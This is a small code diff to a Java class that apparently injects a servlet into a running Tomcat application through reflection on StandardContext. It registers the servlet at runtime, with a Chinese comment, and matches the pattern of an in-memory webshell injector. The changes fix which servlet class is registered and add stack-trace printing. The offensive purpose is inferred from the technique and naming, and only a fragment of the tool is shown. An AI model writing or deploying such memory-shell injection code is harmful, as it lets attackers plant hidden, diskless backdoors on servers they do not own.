@@ -44,7 +44,7 @@ public class TomcatServletJMXMS implements Servlet {
                 if (container == null) {
                     Object wrapper = standardContext.getClass().getDeclaredMethod("createWrapper").invoke(standardContext);
                     wrapper.getClass().getSuperclass().getDeclaredMethod("setName", String.class).invoke(wrapper, NAME);
-                    Servlet servlet = new TomcatServletContextClassMS();
+                    Servlet servlet = new TomcatServletJMXMS();
                     wrapper.getClass().getDeclaredMethod("setServletClass", String.class).invoke(wrapper, servlet.getClass().getName());
                     wrapper.getClass().getDeclaredMethod("setServlet", Servlet.class).invoke(wrapper, servlet);
                     // 添加到 standardContext
@@ -70,6 +70,7 @@ public class TomcatServletJMXMS implements Servlet {
             }
 
         } catch (Exception e) {
+            e.printStackTrace();
         }
     }
 
